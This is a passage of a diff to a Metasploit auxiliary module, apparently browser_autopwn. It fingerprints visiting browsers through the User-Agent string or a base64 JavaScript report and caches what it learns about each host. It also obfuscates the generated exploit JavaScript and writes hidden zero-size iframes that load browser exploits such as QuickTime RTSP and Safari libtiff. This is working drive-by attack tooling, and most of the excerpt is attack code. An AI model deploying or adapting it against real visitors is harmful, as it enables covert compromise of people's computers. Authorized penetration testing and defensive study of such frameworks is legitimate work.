+				js << "};\n" # end function exploit...()
+				js << "#{js_debug("'exploit func: exploit#{browser}()'")}\n"
+				js << "exploit#{browser}();\n" # run that bad boy
+				opts['Symbols']['Methods'].push("exploit#{browser}")
+			end
 		}
-		body << "<div id=\"osx-non-js\">"
-		body << build_iframe(exploit_resource('exploit/windows/browser/apple_quicktime_rtsp'))
-		body << build_iframe(exploit_resource('exploit/osx/armle/safari_libtiff'))
-		body << "</div>"
 
-		response.body = ' <html > <head > <title > Loading </title> '
-		response.body << ' <script language="javascript" type="text/javascript" >'
-		response.body << " <!--\n" + js + ' //-->'
-		response.body << ' </script> </head> ' + body 
-
-		response.body << " </body> </html> "
+		if not datastore['DEBUG']
+			js.obfuscate
+		end
+		response.body = "#{js}"
 
 		return response
 	end
@@ -512,154 +533,102 @@ class Metasploit3 < Msf::Auxiliary
 		os_lang = nil
 		arch = nil
 		ua_name = nil
-		ua_vers = nil
+		ua_ver = nil
 
 		data_offset = request.uri.index('sessid=')
+		p request['User-Agent']
 		if (data_offset.nil? or -1 == data_offset) 
-			print_status("Recording detection from User-Agent")
 			# then we didn't get a report back from our javascript
 			# detection; make a best guess effort from information 
 			# in the user agent string.  The OS detection should be
-			# roughly the same as the javascript version because it
-			# does most everything with navigator.userAgent
-
-			ua = request['User-Agent']
-			# always check for IE last because everybody tries to
-			# look like IE
-			case (ua)
-				when /Version\/(\d+\.\d+\.\d+).*Safari/
-					ua_name = HttpClients::SAFARI
-					ua_vers  = $1
-				when /Firefox\/((:?[0-9]+\.)+[0-9]+)/
-					ua_name = HttpClients::FF
-					ua_vers  = $1
-				when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/
-					ua_name = HttpClients::IE
-					ua_vers  = $1
-			end
-			case (ua)
-				when /Windows/
-					os_name = OperatingSystems::WINDOWS
-					arch = ARCH_X86
-				when /Linux/
-					os_name = OperatingSystems::LINUX
-				when /iPhone/
-					os_name = OperatingSystems::MAC_OSX
-					arch = 'armle'
-				when /Mac OS X/
-					os_name = OperatingSystems::MAC_OSX
-			end
-			case (ua)
-				when /Windows 95/
-					os_flavor = '95'
-				when /Windows 98/
-					os_flavor = '98'
-				when /Windows NT 4/
-					os_flavor = 'NT'
-				when /Windows NT 5.0/
-					os_flavor = '2000'
-				when /Windows NT 5.1/
-					os_flavor = 'XP'
-				when /Windows NT 5.2/
-					os_flavor = '2003'
-				when /Windows NT 6.0/
-					os_flavor = 'Vista'
-				when /Gentoo/
-					os_flavor = 'Gentoo'
-				when /Debian/
-					os_flavor = 'Debian'
-				when /Ubuntu/
-					os_flavor = 'Ubuntu'
-			end
-			case (ua)
-				when /PPC/
-					arch = ARCH_PPC
-				when /i.86/
-					arch = ARCH_X86
-			end
-
-			print_status("Browser claims to be #{ua_name} #{ua_vers}, running on #{os_name} #{os_flavor}")
+			# roughly the same as the javascript version on non-IE
+			# browsers because it does most everything with
+			# navigator.userAgent
+			print_status("Recording detection from User-Agent")
+			report_user_agent(cli.peerhost, request)
 		else
-			print_status("Recording detection from JavaScript")
 			data_offset += 'sessid='.length
 			detected_version = request.uri[data_offset, request.uri.length]
 			if (0 < detected_version.length)
 				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
-				print_status("Report: #{detected_version}")
-				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_vers) = detected_version.split(':')
+				print_status("JavaScript Report: #{detected_version}")
+				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
+				report_host(
+					:host      => cli.peerhost,
+					:os_name   => os_name,
+					:os_flavor => os_flavor, 
+					:os_sp     => os_sp, 
+					:os_lang   => os_lang, 
+					:arch      => arch
+				)
+				report_client(
+					:host      => cli.peerhost,
+					:ua_string => request['User-Agent'],
+					:ua_name   => ua_name,
+					:ua_ver    => ua_ver
+				)
+				report_note(
+					:host => cli.peerhost,
+					:type => 'http_request',
+					:data => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_ver}"
+				)
 			end
 		end
-		arch ||= ARCH_X86
 
-		report_host(
-			:host       => cli.peerhost,
-			:os_name    => os_name,
-			:os_flavor  => os_flavor, 
-			:os_sp      => os_sp, 
-			:os_lang    => os_lang, 
-			:arch       => arch,
-			:ua_name    => ua_name,
-			:ua_vers    => ua_vers
-		)
-		report_note(
-			:host       => cli.peerhost,
-			:type       => 'http_request',
-			:data       => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_vers}"
-		)
+		# If the database is not connected, use a cache instead
+		if (!get_client(cli.peerhost, request['User-Agent']))
+			print_status("No database, using targetcache instead")
+			@targetcache ||= {}
+			@targetcache[cli.peerhost] ||= {}
+			@targetcache[cli.peerhost][:update] = Time.now.to_i
 
-	end
+			# Clean the cache 
+			rmq = []
+			@targetcache.each_key do |addr|
+				if (Time.now.to_i > @targetcache[addr][:update]+60)
+					rmq.push addr
+				end
+			end
+			rmq.each {|addr| @targetcache.delete(addr) }
 
-	def report_host(opts)
-
-		@targetcache[opts[:host]][:os_name]   = opts[:os_name]
-		@targetcache[opts[:host]][:os_flavor] = opts[:os_flavor]
-		@targetcache[opts[:host]][:os_sp]     = opts[:os_sp]
-		@targetcache[opts[:host]][:os_lang]   = opts[:os_lang]
-		@targetcache[opts[:host]][:arch]      = opts[:arch]
-		@targetcache[opts[:host]][:ua_name]   = opts[:ua_name]
-		@targetcache[opts[:host]][:ua_vers]   = opts[:ua_vers]
-
-		super(opts)
-	end
-	
-	# This or something like it should probably be added upstream in Msf::Exploit::Remote
-	def get_target_os(cli)
-		if framework.db.active
-			host = framework.db.get_host(nil, cli.peerhost)
-			res = host.os_name
-		elsif @targetcache[cli.peerhost] and @targetchace[cli.peerhost][:os_name]
-			res = @targetcache[cli.peerhost][:os_name]
-		else
-			res = OperatingSystems::UNKNOWN
+			# Keep the attributes the same as if it were created in
+			# the database.
+			@targetcache[cli.peerhost][:update] = Time.now.to_i
+			@targetcache[cli.peerhost][:ua_string] = request['User-Agent']
+			@targetcache[cli.peerhost][:ua_name] = ua_name
+			@targetcache[cli.peerhost][:ua_ver] = ua_ver
 		end
-		return res
 	end
 
-	# This or something like it should probably be added upstream in Msf::Exploit::Remote
-	def get_target_arch(cli)
-		if framework.db.active
-			host = framework.db.get_host(nil, cli.peerhost)
-			res = host.arch
-		elsif @targetcache[cli.peerhost][:arch]
-			res = @targetcache[cli.peerhost][:arch]
-		else
-			res = ARCH_X86
-		end
-		return res
+	# Override super#get_client to use a cache in case the database
+	# is not available
+	def get_client(host, ua)
+		return super(host, ua) || @targetcache[host]
 	end
 
 	def build_iframe(resource)
 		ret = ''
-		#ret << "<p>#{resource}</p>"
+		#ret << "<p>iframe #{resource}</p>"
 		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
+		#ret << "<iframe src=\"#{resource}\" ></iframe>"
 		return ret
 	end
 
-	def exploit_resource(mod)
-		if (@exploits[mod])
-			return @exploits[mod].get_resource
+	def exploit_resource(name)
+		if (@exploits[name] && @exploits[name].respond_to?("get_resource"))
+			#print_line("Returning '#{@exploits[name].get_resource}', for #{name}")
+			return @exploits[name].get_resource
 		else
-			return "404.html"
+			print_error("Don't have an exploit by that name, returning 404#{name}.html")
+			return "404#{name}.html"
 		end
 	end
+
+	def js_debug(msg)
+		if datastore['DEBUG']
+			return "document.body.innerHTML += #{msg};"
+		end
+		return ""
+	end
 end
+
